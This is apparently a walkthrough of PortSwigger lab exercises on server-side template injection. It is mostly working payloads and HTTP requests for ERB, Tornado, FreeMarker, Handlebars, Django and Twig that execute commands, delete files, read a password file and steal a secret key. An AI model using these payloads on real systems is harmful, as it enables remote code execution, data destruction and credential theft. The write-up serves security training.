---
description: https://portswigger.net/web-security/server-side-template-injection
---

# Server-side template injection

### Lab: Basic server-side template injection

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

`/?message=Unfortunately%20this%20product%20is%20out%20of%20stock`

```
<% import os x=os.popen('id').read() %> ${x} - It gives error:
Internal Server Error (erb):1:in `<main>': undefined local variable or method
`os' for main:Object (NameError) from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'
from /usr/lib/ruby/2.5.0/erb.rb:876:in `result' from -e:4:in `<main>'
```

```
<%= 7 * 7 %>
/?message=<%= 7 * 7 %> - It works!
```

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby---code-execution](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby---code-execution)

**Solution:**

```
<%= system('rm /home/carlos/morale.txt') %>
/?message=%3C%=%20system(%27rm%20/home/carlos/morale.txt%27)%20%%3E
```

### Lab: Basic server-side template injection (code context)

This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

My account -> Preferred Name

```
POST /my-account/change-blog-post-author-display HTTP/1.1
...
blog-post-author-display=user.name&csrf=nHddz37KBT1wKZuCvtMoOuP3ku2frQwT

GET /post?postId=9 HTTP/1.1
Post a comment, you can see the result of injection.
```

```
POST /my-account/change-blog-post-author-display HTTP/1.1
...
blog-post-author-display=}}&csrf=nHddz37KBT1wKZuCvtMoOuP3ku2frQwT - It gives error:

GET /post?postId=9 HTTP/1.1
In response:
"/usr/lib/python2.7/dist-packages/tornado/template.py"
```

```
POST /my-account/change-blog-post-author-display HTTP/1.1
...
blog-post-author-display={{7*7}}&csrf=nHddz37KBT1wKZuCvtMoOuP3ku2frQwT

GET /post?postId=9 HTTP/1.1
In response:
{{49}} | 13 December 2021
```

[https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/](https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/)

```
{%import os%}{{os.popen("whoami").read()}}
```

**Solution:**

```
# user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')

POST /my-account/change-blog-post-author-display HTTP/1.1
...
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')&csrf=nHddz37KBT1wKZuCvtMoOuP3ku2frQwT

GET /post?postId=9 HTTP/1.1
```

### Lab: Server-side template injection using documentation

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

```
GET /product?productId=1 HTTP/1.1
Edit Template ->

GET /product/template?productId=1 HTTP/1.1
In response:
<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.</p>
```

```
Add -> ${evil} - It gives error:
Java FreeMarkerTemplateEngine
```

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#freemarker)

```
${"freemarker.template.utility.Execute"?new()("id")}
```

**Solution:**

```
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```

### Lab: Server-side template injection in an unknown language with a documented exploit

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

`/?message=Unfortunately%20this%20product%20is%20out%20of%20stock`

`/?message={{ - It gives error.`

`/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js`

_**Handlebars NodeJS**_

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#handlebars](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#handlebars)

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Solution:**

**URL Encoded All Characters**

`GET /?message=%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%53%79%6e%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d HTTP/1.1`

### Lab: Server-side template injection with information disclosure via user-supplied objects

This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.

To solve the lab, steal and submit the framework's secret key.

```
GET /product?productId=1 HTTP/1.1
Edit Template ->

GET /product/template?productId=1 HTTP/1.1
In response:
<p>Hurry! Only {{product.stock}} left of {{product.name}} at {{product.price}}.</p>
```

`Add -> {{self.classes()}} - It gives error:`&#x20;

`/usr/lib/python2.7/dist-packages/django/template/base.py`&#x20;

_**Python 2.7 Django**_

`Add -> {{ debug }}`

**In response:**&#x20;

There is a settings Object

[https://docs.djangoproject.com/en/4.0/ref/settings/#secret-key](https://docs.djangoproject.com/en/4.0/ref/settings/#secret-key)

**Solution:**

`{{ settings.SECRET_KEY }}`

### Lab: Server-side template injection in a sandboxed environment

This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file my\_password.txt from Carlos's home directory.

```
GET /product?productId=1 HTTP/1.1
Edit Template ->

GET /product/template?productId=1 HTTP/1.1
In response:
<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}. ${test}</p>
```

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#freemarker)

**For normal rce payloads:** Instantiating freemarker.template.utility.Execute is not allowed in the template for security reasons.

**Solution:**

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
In response:
100 113 56 105 55 115 100 57 51 108 103 102 120 113 55 115 103 50 52 103
```

[https://gchq.github.io/CyberChef/#recipe=From\_Decimal('Space',false)](https://gchq.github.io/CyberChef/#recipe=From\_Decimal\('Space',false\))

### Lab: Server-side template injection with a custom exploit

This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file /.ssh/id\_rsa from Carlos's home directory.

My account -> Preferred Name

```
POST /my-account/change-blog-post-author-display HTTP/1.1
...
blog-post-author-display=user.name&csrf=spkNqnASlalYgtmPvWgbwAlqrjm1OL3q

GET /post?postId=9 HTTP/1.1
# Post a comment, you can see the result of injection.

POST /my-account/change-blog-post-author-display HTTP/1.1
...
blog-post-author-display={{7*7}}&csrf=spkNqnASlalYgtmPvWgbwAlqrjm1OL3q - It gives error:
In response:
"/usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/ExpressionParser.php"

POST /my-account/change-blog-post-author-display HTTP/1.1
...
blog-post-author-display=7*7&csrf=spkNqnASlalYgtmPvWgbwAlqrjm1OL3q

GET /post?postId=9 HTTP/1.1
In response:
{{49}} | 13 December 2021
```

```
POST /my-account/avatar HTTP/1.1

Upload Avatar -> test.txt (Contents: test) - It gives error:

PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/plain in /home/carlos/User.php:28
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/test.txt', 'text/plain')
#1 {main}
  thrown in /home/carlos/User.php on line 28
```

```
POST /my-account/change-blog-post-author-display HTTP/1.1
...
blog-post-author-display=user.setAvatar('/home/carlos/user.php','image/jpg')&csrf=spkNqnASlalYgtmPvWgbwAlqrjm1OL3q

GET /post?postId=9 HTTP/1.1

GET /avatar?avatar=wiener HTTP/1.1

In the response of GET /post?postId=9 HTTP/1.1

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }
```

**Solution:**

```
POST /my-account/change-blog-post-author-display HTTP/1.1
...
blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')&csrf=spkNqnASlalYgtmPvWgbwAlqrjm1OL3q

GET /post?postId=9 HTTP/1.1

POST /my-account/change-blog-post-author-display HTTP/1.1
...
blog-post-author-display=user.gdprDelete()&csrf=spkNqnASlalYgtmPvWgbwAlqrjm1OL3q

GET /post?postId=9 HTTP/1.1
```
